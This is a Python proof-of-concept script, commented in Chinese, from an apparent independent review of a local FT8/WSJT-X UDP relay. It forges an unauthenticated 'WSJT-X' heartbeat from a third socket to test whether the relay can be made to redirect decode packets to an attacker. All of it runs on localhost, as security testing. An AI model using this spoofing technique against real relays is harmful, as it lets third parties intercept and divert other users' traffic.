#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""rd-hijack.py —— 独立审查实测：smart_relay.py 的"学端口"能不能被劫持

场景（全程 127.0.0.1，不碰电台、不发任何真实报文）：
  relay  : subprocess 起 smart_relay.py --listen 127.0.0.1:<P>
  A(真wsjtx): 发一条 id="WSJT-X" 的 Heartbeat  => relay 学到 A
  B(电台/probe): 发一条 id="ft8-headless-probe" 的 Decode => 应被推给 A
  C(攻击者): 伪造一条 id="WSJT-X" 的 Heartbeat => 看 relay 是否改学 C
  B 再发一条 => 看它被推到 A 还是 C
结论判据：如果 C 之后 B 的报文只到 C、A 收不到 => 学端口可被任意第三方劫持（无来源校验）
"""
import os
import socket
import struct
import subprocess
import sys
import time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.stderr.reconfigure(encoding="utf-8", errors="replace")

HERE = os.path.dirname(os.path.abspath(__file__))
RELAY = r"<WORKSPACE>\projects\ft8-client\tools\udp-relay\smart_relay.py"
PY = r"D:\Tools\Python312\python.exe"
HOST = "127.0.0.1"
PORT = 22391          # 高位端口，避开 2237/2238
MAGIC = bytes([0xAD, 0xBC, 0xCB, 0xDA])
TYPE_DECODE = 2
TYPE_HEARTBEAT = 0


def build(typ, ident, payload=b""):
    return (MAGIC + struct.pack("!I", 3) + struct.pack("!I", typ)
            + struct.pack("!I", len(ident)) + ident.encode() + payload)


def drain(sock, label, seconds=1.5):
    """收 seconds 秒，返回收到的字节列表。"""
    sock.settimeout(0.2)
    got = []
    end = time.time() + seconds
    while time.time() < end:
        try:
            data, peer = sock.recvfrom(65535)
            got.append((data, peer))
            print("      [%s] 收到 %d 字节 来自 %s:%d" % (label, len(data), peer[0], peer[1]))
        except socket.timeout:
            continue
        except OSError as e:
            print("      [%s] recv 错误 %s" % (label, e))
            break
    if not got:
        print("      [%s] 什么都没收到" % label)
    return got


def main():
    if not os.path.exists(RELAY):
        print("找不到 relay: %s" % RELAY)
        return 2

    logf = open(os.path.join(HERE, "rd-hijack-relay.log"), "wb")
    proc = subprocess.Popen([PY, RELAY, "--listen", "%s:%d" % (HOST, PORT), "--verbose",
                             "--stats-every", "3600"],
                            stdout=logf, stderr=subprocess.STDOUT,
                            cwd=os.path.dirname(RELAY))
    time.sleep(2.0)
    if proc.poll() is not None:
        print("relay 起不来，rc=%s" % proc.returncode)
        logf.close()
        print(open(os.path.join(HERE, "rd-hijack-relay.log"), "rb").read().decode("utf-8", "replace"))
        return 3
    print("relay 已起 pid=%d listen=%s:%d" % (proc.pid, HOST, PORT))

    try:
        # 三个"客户端"各自绑定一个端口
        A = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); A.bind((HOST, 0))
        B = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); B.bind((HOST, 0))
        C = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); C.bind((HOST, 0))
        print("A(真wsjtx) 端口=%d  B(probe) 端口=%d  C(攻击者) 端口=%d"
              % (A.getsockname()[1], B.getsockname()[1], C.getsockname()[1]))

        print("\n[1] A 发 id=\"WSJT-X\" 的 Heartbeat => relay 应该学到 A")
        A.sendto(build(TYPE_HEARTBEAT, "WSJT-X", b"\x00\x00\x00\x03v1.0"), (HOST, PORT))
        time.sleep(0.6)
        drain(A, "A")

        print("\n[2] B 发 id=\"ft8-headless-probe\" 的 Decode => 应该被推给 A")
        B.sendto(build(TYPE_DECODE, "ft8-headless-probe", b"\x01" + b"\x00" * 20), (HOST, PORT))
        got_a = drain(A, "A")
        step2_ok = len(got_a) == 1
        print("      => 步骤2 %s" % ("成功：远端报文按设计推给了 A" if step2_ok else "失败"))

        print("\n[3] ⭐ C 伪造一条 id=\"WSJT-X\" 的 Heartbeat（无任何鉴权）")
        C.sendto(build(TYPE_HEARTBEAT, "WSJT-X", b"\x00\x00\x00\x03v1.0"), (HOST, PORT))
        time.sleep(0.6)
        drain(C, "C")

        print("\n[4] B 再发一条 Decode => 看谁收到")
        B.sendto(build(TYPE_DECODE, "ft8-headless-probe", b"\x01" + b"\x11" * 20), (HOST, PORT))
        ga = drain(A, "A")
        gc = drain(C, "C")

        print("\n" + "=" * 70)
        if gc and not ga:
            print("★★★ 劫持成功：C 之后 relay 把远端解码全部推给了【攻击者 C】，")
            print("    真正的 A(wsjtx) 一条都收不到。relay 对来源 IP/端口零校验。")
        elif gc and ga:
            print("部分劫持：A 和 C 都收到了（可能是竞态/重复推送）")
        elif not gc and not ga:
            print("未收到任何东西 —— 见 relay 日志")
        else:
            print("★ 未劫持：仍然是 A 收到，C 没收到")
        print("=" * 70)

        print("\n--- relay 日志（关键行）---")
        logf.flush()
        txt = open(os.path.join(HERE, "rd-hijack-relay.log"), "rb").read().decode("utf-8", "replace")
        for line in txt.splitlines():
            if any(k in line for k in ("学到", "推给", "→", "←", "累计", "听", "等本机")):
                print("   " + line)
        return 0
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except Exception:
            proc.kill()
        logf.close()
        print("\nrelay 已停")


if __name__ == "__main__":
    sys.exit(main())
